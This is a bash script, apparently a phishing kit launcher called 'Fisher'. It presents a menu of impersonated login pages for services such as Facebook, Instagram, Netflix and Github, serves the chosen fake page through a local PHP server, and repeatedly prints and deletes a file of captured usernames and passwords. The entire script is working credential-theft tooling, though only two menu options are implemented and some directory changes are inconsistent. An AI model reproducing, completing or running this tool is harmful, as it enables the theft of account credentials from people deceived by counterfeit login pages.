#!/bin/bash


RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"


sudo apt-get install -y php
clear


echo "
$RED_____ _     _               
$RED  ___(_)___| |__   ___ _ __ 
$BLUE| |_  | / __| '_ \ / _ \ '__|
$CYAN|  _| | \__ \ | | |  __/ |   
$WHITE|_|   |_|___/_| |_|\___|_|  

" 

echo "$MAGENTA
[01]Facebook
[02]Instagram
[03]Twitter
[04]Netflix
[05]PlayStation
[06]Twitch
[07]SnapChat
[08]pinterest
[09]Spotify
[10]Reddit
[11]Adobe
[12]Yahoo
[13]Word Press
[14]Yandex
[15]Xbox
[16]Github
[17]Quora
[18]LinkedIn"



#host and port
HOST='127.0.0.1'
PORT='8080'

read -p $GREEN"
Enter your target website: " target_website

if [ $target_website == 1 ]
then 
 cd Websites/Facebook/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
elif [ $target_website == 2 ]
then
cd 
cd Fisher/Websites/Instagram
cd Instagram/ && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
fi
clear

echo $RED"Successfully hosted at:$GREEN http://127.0.0.1:8080"

echo $BLUE"
Press Ctrl + C to exit"$RESETBG
#tail -f ./Websites/Facebook/usernames.txt
while true; do

if [ -e "./Websites/Facebook/usernames.txt" ];then
echo $ORANGE"
Username and Password is captured"
echo $CYAN""
cat ./Websites/Facebook/usernames.txt
rm ./Websites/Facebook/usernames.txt ;
echo $RESETBG""
fi
sleep 1;
done

kill_pid() {
	if [ `pidof php` ]; then
		killall php > /dev/null 2>&1
    fi
}
echo "Bye, bye!"
kill_pid
